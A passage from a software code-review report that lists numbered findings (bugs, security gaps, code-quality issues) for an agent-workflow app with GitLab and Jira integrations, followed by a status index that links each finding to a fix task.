| NODE-18 | CR-084 | — | Medium | The step-build context pack never shows sibling merge state or summaries |
| NODE-19 | CR-085 | — | Medium | Review comment parsing is fragile and unvalidated, so reviews can post nothing or post "undefined" |
| NODE-20 | CR-086 | — | Medium | Review posting isn't idempotent: a retry or partial failure posts duplicate MR comments |
| NODE-21 | CR-087 | — | Medium | Plan `recover()` ignores the `execution_default` knob and duplicates the persistence path |
| NODE-22 | CR-088 | — | Medium | An agent-node chat overwrites the recorded input, so a later Retry loses the inherited upstream input |
| NODE-23 | CR-089 | — | Medium | The plan knobs `default_complex` and `decompose_default` are shown in the UI but never read |
| NODE-24 | CR-090 | — | Medium | Plan meta and step payloads are read from the DB with casts instead of Zod |
| NODE-25 | CR-091 | — | Medium | `plan-node.ts` is a 1,148-line file with about seven responsibilities |
| NODE-26 | CR-092 | — | Medium | Built-ins bypass the shared `execute`/`applyOutcome` persistence path and hand-roll status, output and event writes |
| NODE-27 | CR-093 | — | Medium | Declarative nodes copy-paste the same helpers |
| NODE-28 | CR-094 | — | Medium | Built-in nodes duplicate MR resolution, the "result branch + diff artifact" finalize, and the latest-plan query |
| NODE-29 | CR-095 | — | Medium | Nodes and base services reach into the DB and other nodes' rows directly, and the "injected" services aren't really injected |
| NODE-30 | CR-096 | — | Medium | The declarative def cache is module-level mutable state, and kinds dispatch through `switch` instead of a registry |
| NODE-31 | CR-097 | — | Medium | Several plan-step and plan-validation gaps (cycles, id-less steps, wrong ids in the diff) |
| NODE-32 | CR-199 | — | Low | HTTP node: interpolated values go into the URL unencoded |
| NODE-33 | CR-200 | — | Low | HTTP output and the decision agent prompt carry unbounded payloads |
| NODE-34 | CR-201 | — | Low | Magic strings for statuses, artifact kinds, event kinds and pipeline states throughout the nodes |
| NODE-35 | CR-202 | — | Low | `any`, non-null `!` and unsafe casts in the nodes area |
| NODE-36 | CR-203 | — | Low | Build, review, resolve and pipeline `chat()` overrides drop the chat panel's model override |
| NODE-37 | CR-204 | — | Low | `StepBuildNode` inherits from `BuildNode` to reuse its config, then ignores that config |
| NODE-38 | CR-205 | — | Low | `StreamBuffer` reports the wrong "chars omitted" count once text has been capped |
| NODE-39 | CR-206 | — | Low | `recover()` contracts are inconsistent across nodes (double-fail, or "recovered" after failing) |
| NODE-40 | CR-207 | — | Low | Dead code and dead parameters |
| NODE-41 | CR-208 | — | Low | `merge-request-service.ts` mixes several exports, duplicates its own helper, and isn't a node |
| NODE-42 | CR-209 | — | Low | Resolve marks comments resolved unconditionally and hides git-host failures |
| NODE-43 | CR-041 | TOOL-03, DATA-25 | Low | There are no tests for the pure logic in this area |
| NODE-44 | CR-039 | TOOL-01 | Low | `npm run lint` crashes, so none of the §5 lint rules protect this area |
| DATA-01 | CR-021 | — | High | DB connection is cached before schema/migrations finish — a failed migration is never retried and the app runs half-migrated |
| DATA-02 | CR-022 | — | High | Migrations and seeding are not atomic; table rebuilds are not resumable after a crash |
| DATA-03 | CR-023 | ENG-25 | High | GitLab token embedded in git URLs leaks into error messages, the event log and on-disk `.git/config` |
| DATA-04 | CR-024 | — | High | Single-GitLab-instance fallback claims every repo host and sends the GitLab token to foreign hosts |
| DATA-05 | CR-025 | — | High | No timeouts on any GitLab/Jira HTTP call — pollers and settings requests can hang indefinitely |
| DATA-06 | CR-098 | — | Medium | GitLab list endpoints are not paginated — comments beyond 100 discussions and jobs beyond 20 are silently dropped |
| DATA-07 | CR-099 | — | Medium | GitLab API errors are untyped strings with the full response body; no 429/5xx retry |
| DATA-08 | CR-069 | ENG-24 | Medium | GitLab webhook verification fails open when no secret is set and uses a non-constant-time compare |
| DATA-09 | CR-100 | — | Medium | Branch and ref names reach git argv without validation or a `--` separator (option-injection surface) |
| DATA-10 | CR-101 | — | Medium | Local-agent `ensureBranch` runs git with no timeout and can target the server's own cwd when no workspace is given |
| DATA-11 | CR-102 | — | Medium | `local_agent.timeout_ms` setting is exposed in Settings but never enforced — local runs can run forever |
| DATA-12 | CR-103 | — | Medium | Cache/dep copy falls back to synchronous `fs.cpSync` after a timeout, blocking the Node event loop |
| DATA-13 | CR-104 | — | Medium | Setup/install commands: the timeout kills only the shell, and there is no cancellation path |
| DATA-14 | CR-105 | — | Medium | `shared_dirs` entries are not confined to the hub/worktree (path traversal) and the denylist is bypassable |
| DATA-15 | CR-106 | — | Medium | Per-flow clone dir and per-flow worktree dir are the same path (`workspaces/<flowId>`) |
| DATA-16 | CR-107 | ENG-45 | Medium | Reusing a registered worktree silently checks out a different branch under a possibly running agent |
| DATA-17 | CR-108 | APP-19 | Medium | `Database.uid()` is not monotonic within a millisecond — id-cursor event polling can skip events |
| DATA-18 | CR-109 | — | Medium | Cursor `getRun`/`reattachRun` swallow every error as "still running" |
| DATA-19 | CR-110 | — | Medium | Cloud-run cancel after a restart is a silent no-op that reports success |
| DATA-20 | CR-111 | — | Medium | `pumpRun` can leave a rejected `run.wait()` promise unhandled |
| DATA-21 | CR-112 | — | Medium | One malformed JSON column fails the entire `rows.all()` read |
| DATA-22 | CR-113 | — | Medium | Missing indexes for hot queries |
| DATA-23 | CR-114 | APP-12 | Medium | No FK `ON DELETE` behaviour, and FKs are enforced — deletes throw raw `SqliteError`s |
| DATA-24 | CR-115 | — | Medium | Row mappers bypassed: hand-written row interfaces and unvalidated `db.get/all` in the area |
| DATA-25 | CR-041 | TOOL-03, NODE-43 | Medium | No tests for row mappers, migrations or any service in the area |
| DATA-26 | CR-116 | — | Medium | `lib/db/index.ts` is a god module: connection, migrations, data fixes, seed content and four domain stores |
| DATA-27 | CR-117 | — | Medium | Integration secrets stored in plaintext SQLite and read directly by integrations, bypassing `lib/config.ts` |
| DATA-28 | CR-118 | — | Medium | Integrations and row gateway import the global `db` instead of taking injected dependencies |
| DATA-29 | CR-012 | ENG-07 | Medium | The DB façade exposes no transaction API — zero `transaction()` usages repo-wide |
| DATA-30 | CR-210 | — | Low | `schema.sql` is not the canonical schema; migrations are unversioned and re-run every boot |
| DATA-31 | CR-211 | — | Low | Legacy `flows` table rebuild drops constraints and would fail under enforced FKs |
| DATA-32 | CR-212 | — | Low | Legacy normalizers do full-table scans plus per-row prepares on every boot |
| DATA-33 | CR-213 | — | Low | `any` and non-null `!` in area code |
| DATA-34 | CR-214 | — | Low | Duplicated git exec wrappers, timeouts and helpers across three modules |
| DATA-35 | CR-215 | — | Low | Module-level singletons created outside `processSingleton`, one with mutable state |
| DATA-36 | CR-216 | — | Low | `cursor/credentials.ts` is a cohesive functional module that AGENTS.md section 3.5 says should be a class; setting key repeated |
| DATA-37 | CR-217 | — | Low | Domain magic strings in the DB layer (template ids, node keys, statuses) |
| DATA-38 | CR-218 | — | Low | `listWorktrees` coalescing can serve a pre-mutation scan to callers that require a "fresh" listing |
| DATA-39 | CR-219 | — | Low | SSH-style repo URLs are not supported by GitLab project-path parsing |
| DATA-40 | CR-220 | — | Low | Jira credential test hardcodes the Cloud v3 API and Basic auth; multiple instances are silently ignored |
| DATA-41 | CR-221 | — | Low | `schema.sql` is loaded relative to `process.cwd()` |
| DATA-42 | CR-222 | — | Low | `lib/git/local.ts` depends on the engine layer |
| DATA-43 | CR-223 | — | Low | In-process run handles leak if a started run is never streamed |
| DATA-44 | CR-224 | — | Low | Worktree base resolution silently falls back to the hub's current `HEAD` |
| DATA-45 | CR-225 | — | Low | `getMRChanges` uses the deprecated `/changes` endpoint and ignores truncation |
| FLOWUI-01 | CR-026 | — | High | Event stream replays the cached batch and refetches from cursor "" on remount, so events are duplicated or out of order |
| FLOWUI-02 | CR-027 | — | High | Cockpit `action()` swallows HTTP errors, gives no feedback, and has no pending/double-submit guard |
| FLOWUI-03 | CR-028 | — | High | NodePanel isn't keyed by node, so panel-local state leaks between nodes (including a wrong `choose_node` payload) |
| FLOWUI-04 | CR-119 | — | Medium | Initial event history loads oldest-first, 200 per 3 s poll, and each page invalidates the flow snapshot |
| FLOWUI-05 | CR-120 | — | Medium | `ArtifactLoader` fetches in a raw `useEffect` with no error path: rejections hang on "Loading…" and stale content shows on id change |
| FLOWUI-06 | CR-121 | — | Medium | `useArtifactFetcher` caches HTTP error bodies as artifacts and its "cache" never hits |
| FLOWUI-07 | CR-122 | — | Medium | DecisionView seeds its pick from props once, so a proposal that arrives later is never preselected |
| FLOWUI-08 | CR-123 | — | Medium | AgentView version tabs do nothing when clicked |
| FLOWUI-09 | CR-124 | — | Medium | ChatPanel state carries over between nodes (draft, refine toggle, prompt box, send error) |
| FLOWUI-10 | CR-125 | — | Medium | Plan "Edit prompt" first run ignores the Decompose toggle (uses `start_plan`, while the chat path uses `run_node` with `decompose`) |
| FLOWUI-11 | CR-126 | — | Medium | Prompt previews go stale after a node-config save, and the modal never re-seeds from a fresh refetch |
| FLOWUI-12 | CR-127 | — | Medium | Hydration mismatches: `window.location.origin` and `Date.now()`/`toLocaleTimeString` in SSR'd panel render |
| FLOWUI-13 | CR-128 | — | Medium | Invalid DOM nesting (`<ul>` inside `<p>`, button inside button, interactive inside `role="button"`) |
| FLOWUI-14 | CR-129 | — | Medium | Flow delete failure is hidden behind the still-open dialog, and "Retry" doesn't retry the delete |
| FLOWUI-15 | CR-130 | — | Medium | CostChip shows sub-cent run costs 100× too high |
| FLOWUI-16 | CR-161 | TOOL-08, UI-27 | Medium | `hooks/` is outside the `lib/` import guard; `use-highlighted-code` imports a non-allowlisted lib module |
| FLOWUI-17 | CR-131 | — | Medium | Clickable non-button elements without keyboard support (graph node cards, decision choices, variable chips) |
| FLOWUI-18 | CR-226 | — | Low | `useNodePrompt` shows the previous node's prompt as placeholder data after a node switch |
| FLOWUI-19 | CR-227 | — | Low | Index-based React keys remount rows: run sections lose expand state, and draft rows shift focus |
| FLOWUI-20 | CR-228 | — | Low | Domain strings (actions, node kinds/types, event types, merge statuses, modes) hardcoded instead of constants |
| FLOWUI-21 | CR-229 | — | Low | Single-consumer hooks live in shared `hooks/` instead of their feature folders |
| FLOWUI-22 | CR-230 | — | Low | Oversized files and multiple exported components per file |
| FLOWUI-23 | CR-231 | — | Low | Empty-state markup duplicated instead of reusing `PanelEmptyState`; generic components not in `components/shared/` |
| FLOWUI-24 | CR-232 | — | Low | Duplicated types and transport helpers drift from their sources |
| FLOWUI-25 | CR-233 | — | Low | WorkflowGraph re-runs the dagre layout on every render (every poll and selection click) |
| FLOWUI-26 | CR-234 | — | Low | Sub-flow navigation uses a raw `<a href>`, causing a full page reload and dropping the query cache |
| FLOWUI-27 | CR-235 | — | Low | Cockpit selection reads a ref during render to decide what's shown |
| FLOWUI-28 | CR-236 | — | Low | Inline callbacks created inside `.map()` bodies |
| TPL-01 | CR-029 | — | High | Edits made while a save is in flight (and pending debounced prompt writes) are silently discarded |
| TPL-02 | CR-030 | — | High | Save reports success for 5xx, 413 and other non-400 failures; network errors are unhandled |
| TPL-03 | CR-031 | — | High | Editing HTTP "Headers" writes a string into a `Record<string,string>` field and breaks the node |
| TPL-04 | CR-032 | — | High | Client lets authors build graphs that save rejects; live validation never catches them |
| TPL-05 | CR-033 | — | High | Opening the Start "fields" or Output-schema tab dirties the draft and turns catalog defaults into instance overrides |
| TPL-06 | CR-034 | — | High | Path autocomplete hijacks Tab/Enter, auto-inserts the first variable, and traps keyboard focus |
| TPL-07 | CR-132 | — | Medium | Keyboard delete on the canvas is non-functional (selection is never controlled) |
| TPL-08 | CR-133 | — | Medium | Structural actions build the next draft from the render-captured `draft`, so batched calls clobber each other |
| TPL-09 | CR-134 | — | Medium | Read-only (built-in) templates are editable in the node drawer |
| TPL-10 | CR-135 | — | Medium | `queryKeys.nodeContracts(url)` (and `queryKeys.settings`) are shared by fetchers with different semantics |
| TPL-11 | CR-136 | — | Medium | Live validation results can arrive out of order and re-apply after save |
| TPL-12 | CR-137 | — | Medium | Condition builder round-trip changes expression semantics |
| TPL-13 | CR-138 | — | Medium | ConditionBuilder keeps stale rows when its value becomes empty; index keys make it reproducible |
| TPL-14 | CR-139 | — | Medium | Redo silently drops config edits made after an undo |
| TPL-15 | CR-140 | — | Medium | Revisiting the editor seeds the draft and positions from stale cache; layout autosave can overwrite newer positions |
| TPL-16 | CR-141 | — | Medium | Unsaved-changes guard only covers tab close and the header back button |
| TPL-17 | CR-142 | — | Medium | Gallery cache is not invalidated after create or save, and fresh server props are ignored |
| TPL-18 | CR-143 | — | Medium | Fetchers swallow errors, so error states can never render |
| TPL-19 | CR-144 | — | Medium | Contract and preview queries put the full node config into a GET URL and re-key on every keystroke |
| TPL-20 | CR-145 | — | Medium | Unstable `machine`/`layout` objects and inline callbacks defeat memoization; the canvas rebuilds every render |
| TPL-21 | CR-146 | — | Medium | State-mirroring effects and render-time ref writes (AGENTS.md §2.6) |
| TPL-22 | CR-237 | — | Low | Layout autosave shows "saved" on HTTP errors |
| TPL-23 | CR-163 | TOOL-10 | Low | Suppressed `react-hooks/exhaustive-deps` |
| TPL-24 | CR-238 | — | Low | Duplicated domain magic strings and kind unions |
| TPL-25 | CR-239 | — | Low | Oversized files and files exporting multiple components |
| TPL-26 | CR-240 | — | Low | Accessibility gaps: div-click node card, icon-only buttons without labels, tabs without ARIA |
| TPL-27 | CR-195 | ENG-47 | Low | `lib/engine` imports from `components/template-editor` (inverted boundary) |
| TPL-28 | CR-241 | — | Low | Prompt editor never syncs an externally changed value |
| TPL-29 | CR-242 | — | Low | Schedule interval input can't be cleared or retyped |
| UI-01 | CR-035 | — | High | Repo form persists auto-detected policy as explicit per-repo overrides |
| UI-02 | CR-036 | — | High | Settings fetchers swallow every error, so error states can't render and the UI shows false empty states |
| UI-03 | CR-037 | — | High | Tasks feed ignores query errors, so a failed provider fetch renders as "No tasks match the current filters" |
| UI-04 | CR-038 | — | High | `saveSettings` silently drops failed PATCHes; local-agent toggles (sandbox / --force) fail without feedback |
| UI-05 | CR-147 | — | Medium | `tildePath` collapses *any* user's home (and `/Users/Shared`) to `~`, so edit-and-save rewrites `local_path` |
| UI-06 | CR-148 | — | Medium | Force-refresh race writes one filter-set's results into another filter-set's cache |
| UI-07 | CR-149 | — | Medium | Destructive deletes fire on one click with no confirmation (repos, integration instances, Cursor key) |
| UI-08 | CR-150 | — | Medium | Mutation failures swallowed: instance remove, connection test, and the task repo-pin PATCH |
| UI-09 | CR-151 | — | Medium | Connecting or removing an integration doesn't invalidate settings status, so General's status strip goes stale |
| UI-10 | CR-152 | — | Medium | One global settings error string leaks across sub-routes and is never cleared |
| UI-11 | CR-153 | — | Medium | Build start chain ignores the repo-pin PATCH result and parses non-JSON error bodies |
| UI-12 | CR-154 | — | Medium | Shared `Markdown` loads remote images from any origin in agent-authored content (exfiltration vector) |
| UI-13 | CR-155 | — | Medium | Client types duplicate server/DB shapes and live in a component file instead of `types/` |
| UI-14 | CR-156 | — | Medium | DataTable sortable headers are mouse-only; action link nests a button inside an anchor |
| UI-15 | CR-243 | — | Low | `components/ui/modal.tsx` is a custom wrapper inside the shadcn-only folder |
| UI-16 | CR-244 | — | Low | Sidebar active state uses exact pathname match, so nested routes highlight nothing |
| UI-17 | CR-245 | — | Low | `components/shared` holds app-specific code (sidebar nav routes, "Search tasks…" default) |
| UI-18 | CR-166 | TOOL-13 | Low | Settings barrel omits the provider and hook, forcing deep imports of `settings/context` |
| UI-19 | CR-246 | — | Low | Execution-mode values are raw literals with no shared constant; the `ExecutionMode` name collides |
| UI-20 | CR-247 | — | Low | Magic domain strings in tasks filters and integration tabs |
| UI-21 | CR-248 | — | Low | GitTab / TaskTab are near-duplicates, and three identical modal chromes exist |
| UI-22 | CR-249 | — | Low | Callbacks created inside `.map()` for row components |
| UI-23 | CR-250 | — | Low | Unlabeled form controls in settings and the shared FilterPicker |
| UI-24 | CR-251 | — | Low | `Markdown` memo comparator ignores every prop except `children` |
| UI-25 | CR-252 | — | Low | `DataTable.tsx` is 436 lines with three components |
| UI-26 | CR-253 | — | Low | Task badges: `target="_blank"` without `rel`, and regex if-chains instead of lookup tables |
| UI-27 | CR-161 | TOOL-08, FLOWUI-16 | Low | `types/start-contract.ts` re-exports a runtime value from `lib/engine` into client bundles |
| UI-28 | CR-254 | — | Low | Webhook secrets are part of the client payload types (Needs verification) |
| UI-29 | CR-259 | TOOL-16 | Low | Two different `cn` implementations used side by side |
| UI-30 | CR-255 | — | Low | SettingsProvider fetches unused git-hosts data and gates every sub-route on all three queries |
| UI-31 | CR-256 | — | Low | `createInstance` returns `null` cast as `InstanceRow` |
| TOOL-01 | CR-039 | NODE-44 | High | Lint toolchain is not installable: eslint deps are missing from the lockfile, so `npm run lint` cannot run |
| TOOL-02 | CR-040 | — | High | `.env.example` sets `DATABASE_PATH`, which defeats the production-DB separation, so `next start` uses the demo/seed DB |
| TOOL-03 | CR-041 | DATA-25, NODE-43 | High | No test infrastructure, although the Definition of Done requires tests for service classes and row mappers |
| TOOL-04 | CR-157 | — | Medium | Seed DB guard is a single exact-path blacklist with no allowlist, no realpath and no echo of the target |
| TOOL-05 | CR-158 | — | Medium | Seed scripts and `init-prod-db` run raw `schema.sql` and skip the app's migrations, which can shadow `tickets` data or fail on old DBs |
| TOOL-06 | CR-159 | — | Medium | Seed `reset()` table lists drifted from the engine's `FLOW_CHILD_TABLES` (missing `hooks`, and `step_merges` in 3 of 4 scripts) |
| TOOL-07 | CR-160 | — | Medium | Every `scripts/check-*.ts` and `cursor-usage.ts` is unrunnable as documented |
| TOOL-08 | CR-161 | FLOWUI-16, UI-27 | Medium | `hooks/`, `types/` and `constants/` are outside the client `lib/` import boundary, and there is a live violation in `hooks/use-highlighted-code.ts` |
| TOOL-09 | CR-162 | — | Medium | AGENTS.md §5 rules are downgraded to `warn` for `lib/**` and `scripts/**`, which hides 56 `any` and about 30 `!` |
| TOOL-10 | CR-163 | TPL-23 | Medium | Inline `eslint-disable` of `exhaustive-deps` is not blocked (2 live suppressions) |
| TOOL-11 | CR-164 | — | Medium | `docs/flow-templates/review-notes.yaml` uses an invalid `wait_for` and a non-existent output field |
| TOOL-12 | CR-165 | — | Medium | `server-only` is neither a declared dependency nor lint-enforced; 9 `lib/` modules with db/fs/child_process imports lack it |
| TOOL-13 | CR-166 | UI-18 | Medium | Cross-feature barrel enforcement is partial: `settings/context` deep imports pass, the `panels` pattern is dead, and 5 features are unguarded |
| TOOL-14 | CR-257 | — | Low | `eslint.ignoreDuringBuilds: true` means `next build` never lints |
| TOOL-15 | CR-258 | — | Low | tsconfig strictness gaps: no `noUncheckedIndexedAccess` or `noImplicitOverride`; `.mjs` scripts are not type-checked |
| TOOL-16 | CR-259 | UI-29 | Low | Two competing `cn()` implementations, and `components.json` is out of sync with them |
| TOOL-17 | CR-260 | — | Low | README is stale in several places (env keys, routes, paths, local-mode description) |
| TOOL-18 | CR-261 | — | Low | AGENTS.md seed command variants don't match `package.json` |
| TOOL-19 | CR-262 | — | Low | Seed scripts duplicate boilerplate and hand-replicate engine logic |
| TOOL-20 | CR-263 | — | Low | `sentry-triage.yaml` declares `trigger.type: webhook`, which import silently coerces to `manual` |
| TOOL-21 | CR-264 | — | Low | Local `.env` holds live integration secrets the app no longer reads |
| TOOL-22 | CR-265 | — | Low | `.gitignore` only ignores the literal `.env` |
| TOOL-23 | CR-266 | — | Low | `package.json` has no `engines` field, even though local mode requires Node ≥ 22.13; the `shadcn` CLI is a runtime dependency |
| TOOL-24 | CR-267 | — | Low | `check-worktrees.ts` leaks its temp workspace on failure |
| TOOL-25 | CR-268 | — | Low | Design and plan docs reference files that no longer exist |

## Appendix: status index

One row per finding, at `abaa007`.

| CR | Severity | Type | Status | Task |
| --- | --- | --- | --- | --- |
| CR-001 | Critical | Security | Open | [Task 57](review-tasks/57-security-local-api-hardening.md) |
| CR-002 | High | Security | Open | [Task 57](review-tasks/57-security-local-api-hardening.md) |
| CR-003 | High | Gap | Partly fixed | [Task 10](review-tasks/10-api-input-validation-flows.md), [Task 11](review-tasks/11-api-input-validation-settings.md) |
| CR-004 | High | Bug | Fixed | [Task 28](review-tasks/28-prompt-preview-parity.md) |
| CR-005 | High | Bug | Fixed | [Task 13](review-tasks/13-frontend-query-ownership.md) |
| CR-006 | High | Bug | Fixed (Task 25) | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
| CR-007 | High | Bug | Fixed | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
| CR-008 | High | Bug | Fixed | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
| CR-009 | High | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
| CR-010 | High | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
| CR-011 | High | Bug | Fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
| CR-012 | High | Bug | Fixed | [Task 12](review-tasks/12-db-transactions.md) |
| CR-013 | High | Bug | Fixed (Task 27) | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
| CR-014 | High | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
| CR-015 | High | Bug | Fixed | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
| CR-016 | High | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-017 | High | Bug | Fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
| CR-018 | High | Bug | Fixed | — |
| CR-019 | High | Bug | Fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
| CR-020 | High | Bug | Fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
| CR-021 | High | Infra | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-022 | Medium | Infra | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-023 | High | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
| CR-024 | High | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
| CR-025 | High | Gap | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-026 | High | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
| CR-027 | High | Gap | Fixed | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
| CR-028 | High | Bug | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-029 | High | Bug | Fixed (Task 37) | [Task 37](review-tasks/37-editor-save-integrity.md) |
| CR-030 | High | Bug | Fixed (Task 37) | [Task 37](review-tasks/37-editor-save-integrity.md) |
| CR-031 | High | Bug | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-032 | High | Gap | Fixed | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
| CR-033 | High | Bug | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-034 | High | Accessibility | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-035 | High | Bug | Open | [Task 42](review-tasks/42-settings-forms.md) |
| CR-036 | High | Gap | Open | [Task 14](review-tasks/14-frontend-throwing-fetchers.md) |
| CR-037 | High | Gap | Open | [Task 43](review-tasks/43-tasks-feature.md) |
| CR-038 | High | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
| CR-039 | High | Infra | Fixed | — |
| CR-040 | High | Bug | Fixed | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
| CR-041 | Medium | Infra | Partly fixed | [Task 05](review-tasks/05-test-coverage-baseline.md) |
| CR-042 | Medium | Bug | Open | [Task 10](review-tasks/10-api-input-validation-flows.md) |
| CR-043 | Medium | Bug | Open | [Task 29](review-tasks/29-webhook-reliability.md) |
| CR-044 | Medium | Bug | Open | [Task 29](review-tasks/29-webhook-reliability.md) |
| CR-045 | Medium | Bug | Fixed (Task 25) | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
| CR-046 | Medium | Code quality | Open | [Task 09](review-tasks/09-typed-errors.md) |
| CR-047 | Medium | Gap | Open | [Task 10](review-tasks/10-api-input-validation-flows.md) |
| CR-048 | Medium | Bug | Fixed | [Task 11](review-tasks/11-api-input-validation-settings.md) |
| CR-049 | Low | Code quality | Fixed | [Task 28](review-tasks/28-prompt-preview-parity.md) |
| CR-050 | Medium | Bug | Fixed | [Task 12](review-tasks/12-db-transactions.md) |
| CR-051 | Medium | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-052 | Medium | Code quality | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
| CR-053 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-054 | Medium | Bug | Fixed | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
| CR-055 | Medium | Bug | Fixed | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
| CR-056 | Medium | Bug | Fixed | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
| CR-057 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
| CR-058 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
| CR-059 | Medium | Bug | Fixed | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
| CR-060 | Medium | Bug | Fixed (Task 25) | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
| CR-061 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
| CR-062 | Medium | Gap | Fixed | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
| CR-063 | Medium | Gap | Fixed | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
| CR-064 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
| CR-065 | Medium | Bug | Fixed | [Task 24](review-tasks/24-template-snapshot-and-yaml.md) |
| CR-066 | Medium | Bug | Fixed | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
| CR-067 | Medium | Bug | Fixed | [Task 12](review-tasks/12-db-transactions.md) |
| CR-068 | Medium | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-069 | Medium | Security | Open | [Task 58](review-tasks/58-security-webhook-auth.md) |
| CR-070 | Medium | Code quality | Open | [Task 45](review-tasks/45-flow-engine-decomposition.md) |
| CR-071 | Medium | Code quality | Partly fixed | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
| CR-072 | Medium | Bug | Fixed | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
| CR-073 | Medium | Bug | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-074 | Medium | Bug | Fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
| CR-075 | Medium | Bug | Fixed (Task 22) | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
| CR-076 | Medium | Gap | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-077 | Medium | Bug | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-078 | Medium | Bug | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-079 | Medium | Bug | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-080 | Medium | Bug | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-081 | Medium | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
| CR-082 | Medium | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
| CR-083 | Medium | Bug | Fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
| CR-084 | Medium | Bug | Fixed (Task 27) | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
| CR-085 | Medium | Bug | Fixed (Task 22) | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
| CR-086 | Medium | Bug | Fixed (Task 22) | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
| CR-087 | Medium | Bug | Fixed | — |
| CR-088 | Medium | Bug | Fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
| CR-089 | Low | Code quality | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-090 | Medium | Code quality | Fixed (Task 27) | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
| CR-091 | Medium | Code quality | Fixed | — |
| CR-092 | Medium | Code quality | Fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
| CR-093 | Medium | Code quality | Partly fixed | [Task 49](review-tasks/49-node-kind-structure.md) |
| CR-094 | Medium | Code quality | Fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
| CR-095 | Medium | Code quality | Partly fixed | [Task 48](review-tasks/48-backend-dependency-injection.md) |
| CR-096 | Medium | Code quality | Open | [Task 49](review-tasks/49-node-kind-structure.md) |
| CR-097 | Low | Bug | Partly fixed (Task 27) | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
| CR-098 | Medium | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-099 | Medium | Gap | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-100 | Medium | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-101 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
| CR-102 | Medium | Gap | Open | [Task 32](review-tasks/32-agent-ports.md) |
| CR-103 | Medium | Bug | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-104 | Medium | Bug | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-105 | Medium | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-106 | Medium | Bug | Fixed | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
| CR-107 | Medium | Bug | Fixed | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
| CR-108 | Medium | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
| CR-109 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
